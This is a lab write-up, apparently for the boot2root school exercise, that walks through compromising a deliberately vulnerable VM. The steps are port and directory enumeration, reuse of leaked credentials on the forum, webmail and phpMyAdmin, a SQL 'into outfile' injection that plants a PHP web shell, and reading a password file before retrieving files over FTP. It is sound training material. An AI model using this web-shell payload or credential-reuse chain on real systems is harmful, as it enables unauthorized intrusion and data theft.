# *Write Up 1*

## Init
Installation of a Parrot Security ISO
>[Parrot](https://www.parrotsec.org/download/_)

We have to use some tools during the process so we use a VM with already some tools installed.

## Enumerate
To start, we need to list all the services which run on the machine.

First, use `nmap` to list active ports and the correspondants services.

```
➜  boot2root git:(main) nmap -sV 192.168.56.105
Not shown: 994 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22
993/tcp open  ssl/imaps?
```
We can see there is a `http server` who runs on port `443`

![image](https://github.com/JoLMG42/boot2root/assets/94530285/a6a099ac-39a0-4ee4-bd7d-5a0131762458)

We can use `dirb` on Parrot examine roads of the server

```
┌─[user@parrot]─[~]
└──╼ $dirb https://192.168.56.101
 ==> DIRECTORY: https://192.168.56.101/forum/
 ==> DIRECTORY: https://192.168.56.101/phpmyadmin/
 ==> DIRECTORY: https://192.168.56.101/webmail/
```

When we try to access `phpmyadmin` and `webmail`, we need a `login` and a `password`, so go on forum for the moment.

![image](https://github.com/JoLMG42/boot2root/assets/94530285/f0a3b0d2-f0a2-43de-aa4d-e5ba1f7c90e3)

We see a `post` about `Probleme login ?` by a user named lmezard

In this post we found a log about a connection to a service and we found a password of lmezard.

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

So try to login on the forum with these logs:
>login: `lmezard` password: `!q\]Ej?*5K5cy*AJ`

Youhou we are connected.

Now, we find an email in the informations section of lmezard,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/d683c07d-224b-489d-a523-c678d4c3074d)

So go on the webmail service, try to log with our logs:

>login: `laurie@borntosec.net` password: `!q\]Ej?*5K5cy*AJ`

In the receive mail section, we have this mail,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/c7bf327c-9d7a-4eee-84c2-3856d628b92a)

So go on phpmyadmin,

>login: `root` password: `Fg-'kKXBj87E:aJ$`

Now we have access to the database and we have a SQL page where we can improve sql injections:

https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/

![image](https://github.com/JoLMG42/boot2root/assets/94530285/5b4d943c-0e27-4cbf-8198-715e9ab78d36)

>sqli: `SELECT 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php' #`


Now if we target this url: `https://192.168.56.101/forum/templates_c/cmd.php?cmd=`, we can execute every commands on the machine

If we execute `ls /home` we can see a directory named LOOKATME,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/f223cbe0-2207-466e-ae17-5bd8896d4015)

After dig in, we found a file password, lets cat it,

>https://192.168.56.101/forum/templates_c/cmd.php?cmd=cat%20/home/LOOKATME/password

>login: `lmezard` password `G!@M6f4Eatau{sF"`

After try some service with these logs, we found we can connect to FTP with it and we see two files, lets get it,


```
➜  ~ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61451|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||14650|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |***************************************************************************|    96      118.52 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (56.03 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||53956|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***************************************************************************|   790 KiB   26.64 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (25.62 MiB/s)
```

The README file says: `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.

So we have file fun:
1. examine informations about the file:
   ```
   ➜  ~ file fun
   fun: POSIX tar archive (GNU)
   ```
2. extract files:
   ```
   ➜  ~ tar -xvf fun
   ft_fun/
   ft_fun/C4D03.pcap
   ft_fun/GKGEP.pcap
   ft_fun/A5GPY.pcap
   ft_fun/K8SEB.pcap
   ft_fun/PFG98.pcap
   ...
   ```





